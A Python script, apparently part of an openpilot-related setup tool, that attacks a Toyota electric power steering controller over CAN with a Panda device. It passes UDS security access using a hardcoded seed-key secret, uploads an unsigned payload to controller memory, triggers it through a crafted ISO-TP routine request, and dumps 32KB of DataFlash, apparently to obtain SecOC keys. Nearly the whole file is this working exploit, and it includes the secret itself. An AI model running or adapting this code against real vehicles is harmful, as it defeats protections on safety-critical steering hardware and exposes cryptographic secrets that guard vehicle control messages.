"""
Step 4: DataFlash Dump — Upload payload and dump EPS memory.

Vehicle requirement: IG-ON only (not READY)
May need 2 runs with power cycle between them (prime + dump pattern).

Dumps range: 0xFF200000 - 0xFF208000 (32KB)
"""

from __future__ import annotations

import base64
import hashlib
import json
import struct
import subprocess
import time
from pathlib import Path

import sys
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

# EPS UDS parameters
TX_ADDR = 0x7A1
RX_ADDR = 0x7A9
BUS = 0
DUMP_START = 0xFF200000
DUMP_END = 0xFF208000

# Payload parameters
PAYLOAD_LOAD_ADDR = 0xFEBF0000
PAYLOAD_LOAD_SIZE = 0x1000
TRIGGER_ADDR = 0x000E0000
TRIGGER_SIZE = 0x8000
SEED_KEY_SECRET = bytes.fromhex("f05f36b7d78c03e24ab4faef2a57d044")
DID_201_KEY = b"\x00" * 16
DID_202_IV = b"\x00" * 16

# Known-good payload for 0xFF200000-0xFF208000
PAYLOAD_SHA256 = "d48988366b5e6d2ddd7438caca5e6f6f02daba9b650263c323a2ffd770a06e34"


def derive_security_key(seed: bytes) -> bytes:
    from Crypto.Cipher import AES
    seed_payload = b"\x00" * 16
    key = AES.new(SEED_KEY_SECRET, AES.MODE_ECB).decrypt(seed_payload)
    return AES.new(key, AES.MODE_ECB).encrypt(seed)


def run(state: dict, setup_dir: Path, auto_yes: bool) -> bool:
    """Run DataFlash dump. Returns True if complete."""
    from toyota_dataflash_secoc_setup import mark_step, confirm

    dump_file = setup_dir / f"dump_{DUMP_START:08x}_{DUMP_END:08x}.bin"
    prev_status = state.get("steps", {}).get("dump_dataflash", {}).get("status")
    attempts = state.get("steps", {}).get("dump_dataflash", {}).get("attempts", 0)

    if prev_status == "primed":
        print("[dump] Previous run primed the EPS. This run should get the full dump.")
        print("[dump] Make sure you power-cycled: OFF → 30s wait → IG-ON")
        print()

    # Find payload
    payload_path = setup_dir / "payload_dataflash_ff200000_ff208000.bin"
    if not payload_path.exists():
        # Try to find it in the research kit
        kit_payload = Path(__file__).resolve().parent.parent.parent / "tss3_remote_dump_research_kit" / "payload_dataflash_ff200000_ff208000.bin"
        if kit_payload.exists():
            import shutil
            shutil.copy2(kit_payload, payload_path)
            print(f"[dump] Copied payload from research kit")
        else:
            print(f"[ERROR] Payload not found: {payload_path}")
            print(f"        Place payload_dataflash_ff200000_ff208000.bin in {setup_dir}")
            mark_step(state, "dump_dataflash", "failed", error="payload not found")
            return False

    payload = payload_path.read_bytes()
    if hashlib.sha256(payload).hexdigest() != PAYLOAD_SHA256:
        print("[ERROR] Payload SHA256 mismatch!")
        mark_step(state, "dump_dataflash", "failed", error="payload sha256 mismatch")
        return False

    print(f"[dump] Payload verified ({len(payload)} bytes)")
    print(f"[dump] Target range: 0x{DUMP_START:08x} - 0x{DUMP_END:08x}")
    print()

    # Stop openpilot
    print("[dump] Stopping openpilot/boardd...")
    for cmd in [["sudo", "systemctl", "stop", "comma"], ["pkill", "-f", "boardd"]]:
        try:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        except Exception:
            pass
    time.sleep(1.0)

    # Import dependencies
    try:
        from panda import Panda
        from Crypto.Cipher import AES
    except ImportError as e:
        print(f"[ERROR] Missing dependency: {e}")
        mark_step(state, "dump_dataflash", "failed", error=str(e))
        return False

    uds_mod = None
    for modname in ("opendbc.car.uds", "panda.python.uds", "panda.uds"):
        try:
            uds_mod = __import__(modname, fromlist=["UdsClient"])
            break
        except Exception:
            continue
    if uds_mod is None:
        print("[ERROR] Cannot import UDS module")
        mark_step(state, "dump_dataflash", "failed", error="UDS module not found")
        return False

    # Connect
    try:
        panda = Panda()
        panda.set_safety_mode(3)
        print("[dump] Connected to Panda")
    except Exception as e:
        print(f"[ERROR] Panda connection failed: {e}")
        mark_step(state, "dump_dataflash", "failed", error=str(e))
        return False

    # UDS client
    uds = None
    for kwargs in [{"timeout": 0.1, "debug": False}, {"timeout": 0.1}, {}]:
        try:
            uds = uds_mod.UdsClient(panda, TX_ADDR, RX_ADDR, BUS, **kwargs)
            break
        except TypeError:
            continue

    try:
        # Programming session
        print("[dump] Entering programming session...")
        uds.diagnostic_session_control(uds_mod.SESSION_TYPE.DEFAULT)
        time.sleep(0.5)
        uds.diagnostic_session_control(uds_mod.SESSION_TYPE.EXTENDED_DIAGNOSTIC)
        time.sleep(0.7)
        uds.diagnostic_session_control(uds_mod.SESSION_TYPE.PROGRAMMING)
        time.sleep(1.0)
        uds.diagnostic_session_control(uds_mod.SESSION_TYPE.PROGRAMMING)
        print("[dump] ✓ Programming session OK")

        # Security access
        print("[dump] Security access...")
        seed = uds.security_access(uds_mod.ACCESS_TYPE.REQUEST_SEED, data_record=b"\x00" * 16)
        key = derive_security_key(seed)
        uds.security_access(uds_mod.ACCESS_TYPE.SEND_KEY, key)
        print("[dump] ✓ Security access OK")

        # Write DIDs
        uds.write_data_by_identifier(0x203, b"\x00" * 5)
        uds.write_data_by_identifier(0x201, DID_201_KEY)
        uds.write_data_by_identifier(0x202, DID_202_IV)
        print("[dump] ✓ DIDs written")

        # Upload payload
        print("[dump] Uploading payload...")
        data = b"\x01\x46\x01\x00" + struct.pack("!I", PAYLOAD_LOAD_ADDR) + struct.pack("!I", PAYLOAD_LOAD_SIZE)
        uds._uds_request(uds_mod.SERVICE_TYPE.REQUEST_DOWNLOAD, data=data)
        for block in range(0, len(payload), 0x400):
            block_no = block // 0x400 + 1
            uds.transfer_data(block_no, payload[block:block + 0x400])
        uds.request_transfer_exit()
        print("[dump] ✓ Payload uploaded")

        # Trigger
        print("[dump] Triggering payload...")
        verify_data = b"\x45\x00" + struct.pack("!I", PAYLOAD_LOAD_ADDR) + struct.pack("!I", PAYLOAD_LOAD_SIZE)
        uds.routine_control(uds_mod.ROUTINE_CONTROL_TYPE.START, 0x10F0, verify_data)

        erase_data = b"\x45\x00" + struct.pack("!I", TRIGGER_ADDR) + struct.pack("!I", TRIGGER_SIZE)
        raw = b"\x31\x01\xff\x00" + erase_data
        # Manual ISO-TP send
        first = bytes([0x10 | ((len(raw) >> 8) & 0x0F), len(raw) & 0xFF]) + raw[:6]
        first = first.ljust(8, b"\x00")
        panda.can_send(TX_ADDR, first, BUS)
        deadline = time.time() + 1.0
        while time.time() < deadline:
            for addr, data_frame, frame_bus in panda.can_recv():
                if frame_bus == BUS and addr == RX_ADDR and len(data_frame) >= 1 and (data_frame[0] & 0xF0) == 0x30:
                    deadline = 0
                    break
            time.sleep(0.005)
        seq = 1
        idx = 6
        while idx < len(raw):
            chunk = raw[idx:idx + 7]
            frame = (bytes([0x20 | (seq & 0x0F)]) + chunk).ljust(8, b"\x00")
            panda.can_send(TX_ADDR, frame, BUS)
            idx += len(chunk)
            seq += 1
            time.sleep(0.01)
        print("[dump] ✓ Payload triggered")

        # Collect dump frames
        print("[dump] Collecting dump frames...")
        total_size = DUMP_END - DUMP_START
        dump_buf = bytearray(total_size)
        received = bytearray(total_size)
        frames_count = 0
        last_progress = time.time()
        begin = time.time()
        idle_timeout = 10.0
        max_seconds = 240.0

        while True:
            if time.time() - begin > max_seconds:
                break
            batch = panda.can_recv()
            if not batch:
                if time.time() - last_progress > idle_timeout:
                    break
                time.sleep(0.001)
                continue
            made_progress = False
            for addr, data_frame, frame_bus in batch:
                if frame_bus != BUS or addr != RX_ADDR or len(data_frame) < 8:
                    continue
                if data_frame == b"\x03\x7f\x31\x78\x00\x00\x00\x00":
                    continue
                df0 = struct.unpack("<I", data_frame[:4])[0]
                ptr_low24 = (df0 >> 8) & 0xFFFFFF
                mem_addr = (DUMP_START & 0xFF000000) | ptr_low24
                offset = mem_addr - DUMP_START
                if offset < 0 or offset >= total_size:
                    continue
                dump_buf[offset:offset + 4] = data_frame[4:8]
                received[offset:offset + 4] = b"\x01\x01\x01\x01"
                frames_count += 1
                made_progress = True
                if frames_count % 512 == 0:
                    print(f"    frames={frames_count} bytes={frames_count * 4}")
            if made_progress:
                last_progress = time.time()
            if frames_count >= total_size // 4:
                break

        bytes_received = sum(1 for b in received if b)
        print(f"\n[dump] Frames: {frames_count}, Bytes: {bytes_received}/{total_size}")

    except Exception as e:
        print(f"[ERROR] Dump failed: {e}")
        mark_step(state, "dump_dataflash", "failed", error=str(e), attempts=attempts + 1)
        return False

    # Check result
    if bytes_received >= total_size:
        dump_file.write_bytes(bytes(dump_buf))
        print(f"[dump] ✓ Complete dump saved: {dump_file}")
        mark_step(state, "dump_dataflash", "complete",
                  dump_file=str(dump_file),
                  bytes=bytes_received,
                  frames=frames_count,
                  attempts=attempts + 1)
        return True
    elif frames_count <= 2:
        # Prime pattern — got 1-2 frames, need power cycle
        print()
        print("[dump] ⚡ EPS primed (got 1 frame). This is expected on first run.")
        print()
        print("  ⚠️  ACTION REQUIRED:")
        print("     1. Turn car completely OFF")
        print("     2. Wait 30 seconds")
        print("     3. Turn to IG-ON (press start WITHOUT brake)")
        print("     4. Re-run: python3 toyota_dataflash_secoc_setup.py")
        print()
        mark_step(state, "dump_dataflash", "primed", attempts=attempts + 1, bytes=bytes_received)
        return False
    else:
        # Partial dump
        dump_file.write_bytes(bytes(dump_buf))
        print(f"[dump] Partial dump: {bytes_received}/{total_size} bytes")
        print("[dump] May need another power cycle and retry")
        mark_step(state, "dump_dataflash", "primed", attempts=attempts + 1,
                  bytes=bytes_received, partial_file=str(dump_file))
        return False
